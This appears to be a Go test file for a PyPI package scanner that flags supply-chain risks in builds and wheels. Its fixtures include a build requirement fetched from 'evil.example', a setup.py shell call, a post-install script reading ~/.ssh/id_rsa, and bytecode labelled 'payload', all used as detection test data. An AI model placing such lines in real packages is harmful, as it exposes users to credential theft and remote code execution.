package pypi

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/sairintechnologycom/pkgsafe/internal/policy"
	"github.com/sairintechnologycom/pkgsafe/internal/types"
)

func writeTree(t *testing.T, root string, files map[string]string) {
	t.Helper()
	for rel, content := range files {
		path := filepath.Join(root, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
}

func TestAnalyzeDirFlagsInTreeBackendAndDirectBuildRequires(t *testing.T) {
	dir := t.TempDir()
	writeTree(t, dir, map[string]string{
		"pyproject.toml": `[build-system]
requires = [
    "setuptools>=61",
    "helper @ https://evil.example/helper-1.0.tar.gz",
]
build-backend = "backend"
backend-path = ["."]
`,
	})
	analysis, err := AnalyzeDir(dir, Metadata{Name: "demo", Version: "0.1.0", Source: true}, policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	for _, id := range []string{"pypi_in_tree_build_backend", "pypi_build_requires_direct_reference", "pypi_unknown_build_backend"} {
		if !hasReason(analysis.Findings, id) {
			t.Fatalf("expected reason %s in %+v", id, analysis.Findings)
		}
	}
	if analysis.Artifact.BuildBackendPath != "." {
		t.Fatalf("backend-path not recorded: %+v", analysis.Artifact)
	}
	if analysis.Result.Decision == types.DecisionAllow {
		t.Fatalf("in-tree backend plus direct build requirement must not be a clean allow, got %s", analysis.Result.Decision)
	}
}

func TestAnalyzeDirBuildSystemKeysOutsideSectionIgnored(t *testing.T) {
	dir := t.TempDir()
	writeTree(t, dir, map[string]string{
		"pyproject.toml": `[build-system]
requires = ["hatchling"]
build-backend = "hatchling.build"

[tool.example]
backend-path = ["not-a-build-key"]
requires = ["pkg @ https://example.com/x.whl"]
`,
	})
	analysis, err := AnalyzeDir(dir, Metadata{Name: "demo", Version: "0.1.0", Source: true}, policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	for _, id := range []string{"pypi_in_tree_build_backend", "pypi_build_requires_direct_reference", "pypi_unknown_build_backend"} {
		if hasReason(analysis.Findings, id) {
			t.Fatalf("keys outside [build-system] must not score %s: %+v", id, analysis.Findings)
		}
	}
}

func TestAnalyzeDirFlagsOrphanedBytecode(t *testing.T) {
	dir := t.TempDir()
	writeTree(t, dir, map[string]string{
		"pkg/__init__.py":                         "",
		"pkg/visible.py":                          "x = 1",
		"pkg/__pycache__/visible.cpython-311.pyc": "\x61\x0d\x0d\x0a bytecode",
		"pkg/__pycache__/hidden.cpython-311.pyc":  "\x61\x0d\x0d\x0a payload",
	})
	analysis, err := AnalyzeDir(dir, Metadata{Name: "demo", Version: "0.1.0", Wheel: true}, policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(analysis.Findings, "pypi_compiled_bytecode_payload") {
		t.Fatalf("expected orphaned bytecode finding: %+v", analysis.Findings)
	}
	if !analysis.Artifact.OrphanedBytecode {
		t.Fatal("artifact summary should mark orphaned bytecode")
	}
}

func TestAnalyzeDirBytecodeWithMatchingSourceIsClean(t *testing.T) {
	dir := t.TempDir()
	writeTree(t, dir, map[string]string{
		"pkg/mod.py":                          "x = 1",
		"pkg/__pycache__/mod.cpython-311.pyc": "bytecode",
		"legacy/tool.py":                      "y = 2",
		"legacy/tool.pyc":                     "bytecode",
	})
	analysis, err := AnalyzeDir(dir, Metadata{Name: "demo", Version: "0.1.0", Source: true}, policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if hasReason(analysis.Findings, "pypi_compiled_bytecode_payload") {
		t.Fatalf("bytecode with matching source must not score: %+v", analysis.Findings)
	}
}

func TestAnalyzeDirWheelRecordChecks(t *testing.T) {
	t.Run("unlisted files flagged", func(t *testing.T) {
		dir := t.TempDir()
		writeTree(t, dir, map[string]string{
			"artifact-0/demo/__init__.py":            "",
			"artifact-0/demo/extra.py":               "smuggled = True",
			"artifact-0/demo-1.0.dist-info/METADATA": "Name: demo",
			"artifact-0/demo-1.0.dist-info/RECORD": `demo/__init__.py,sha256=abc,0
demo-1.0.dist-info/METADATA,sha256=def,10
demo-1.0.dist-info/RECORD,,
`,
			// A source distribution extracted alongside must not count as unlisted.
			"artifact-1/demo-1.0/setup.cfg": "",
		})
		analysis, err := AnalyzeDir(dir, Metadata{Name: "demo", Version: "1.0", Wheel: true, Source: true}, policy.Default())
		if err != nil {
			t.Fatal(err)
		}
		if !hasReason(analysis.Findings, "pypi_wheel_record_unlisted_files") {
			t.Fatalf("expected unlisted-files finding: %+v", analysis.Findings)
		}
		for _, r := range analysis.Findings {
			if r.ID == "pypi_wheel_record_unlisted_files" && r.Evidence != "artifact-0/demo/extra.py" {
				t.Fatalf("unexpected unlisted evidence: %q", r.Evidence)
			}
		}
	})
	t.Run("complete record is clean", func(t *testing.T) {
		dir := t.TempDir()
		writeTree(t, dir, map[string]string{
			"artifact-0/demo/__init__.py":            "",
			"artifact-0/demo-1.0.dist-info/METADATA": "Name: demo",
			"artifact-0/demo-1.0.dist-info/RECORD": `demo/__init__.py,sha256=abc,0
demo-1.0.dist-info/METADATA,sha256=def,10
demo-1.0.dist-info/RECORD,,
`,
		})
		analysis, err := AnalyzeDir(dir, Metadata{Name: "demo", Version: "1.0", Wheel: true}, policy.Default())
		if err != nil {
			t.Fatal(err)
		}
		for _, id := range []string{"pypi_wheel_record_unlisted_files", "pypi_wheel_record_missing"} {
			if hasReason(analysis.Findings, id) {
				t.Fatalf("complete RECORD must not score %s: %+v", id, analysis.Findings)
			}
		}
	})
	t.Run("missing record flagged", func(t *testing.T) {
		dir := t.TempDir()
		writeTree(t, dir, map[string]string{
			"artifact-0/demo/__init__.py": "",
		})
		analysis, err := AnalyzeDir(dir, Metadata{Name: "demo", Version: "1.0", Wheel: true}, policy.Default())
		if err != nil {
			t.Fatal(err)
		}
		if !hasReason(analysis.Findings, "pypi_wheel_record_missing") {
			t.Fatalf("expected record-missing finding: %+v", analysis.Findings)
		}
	})
}

func TestAnalyzeDirNestedExampleManifestsAreInert(t *testing.T) {
	dir := t.TempDir()
	writeTree(t, dir, map[string]string{
		"artifact-1/demo-1.0/setup.py":                  "from setuptools import setup\nsetup()",
		"artifact-1/demo-1.0/examples/complex/setup.py": "import os; os.system('anything')",
		"artifact-1/demo-1.0/examples/complex/pyproject.toml": `[build-system]
build-backend = "backend"
backend-path = ["."]
`,
	})
	analysis, err := AnalyzeDir(dir, Metadata{Name: "demo", Version: "1.0", Source: true}, policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	setupPresent := 0
	for _, r := range analysis.Findings {
		if r.ID == "pypi_setup_py_present" {
			setupPresent++
		}
	}
	if setupPresent != 1 {
		t.Fatalf("only the root setup.py participates in install; got %d findings: %+v", setupPresent, analysis.Findings)
	}
	for _, id := range []string{"pypi_setup_py_shell_execution", "pypi_in_tree_build_backend", "pypi_unknown_build_backend"} {
		if hasReason(analysis.Findings, id) {
			t.Fatalf("nested example manifests must not score %s: %+v", id, analysis.Findings)
		}
	}
}

func TestAnalyzeDirWheelDataScriptsAreExecutionSurface(t *testing.T) {
	dir := t.TempDir()
	writeTree(t, dir, map[string]string{
		"demo-1.0.data/scripts/post-install.py": `
import os
open(os.path.expanduser("~/.ssh/id_rsa"))
`,
	})
	analysis, err := AnalyzeDir(dir, Metadata{Name: "demo", Version: "1.0", Wheel: true}, policy.Default())
	if err != nil {
		t.Fatal(err)
	}
	if !hasReason(analysis.Findings, "pypi_credential_path_access") {
		t.Fatalf("wheel data scripts must be analyzed as execution surface: %+v", analysis.Findings)
	}
}
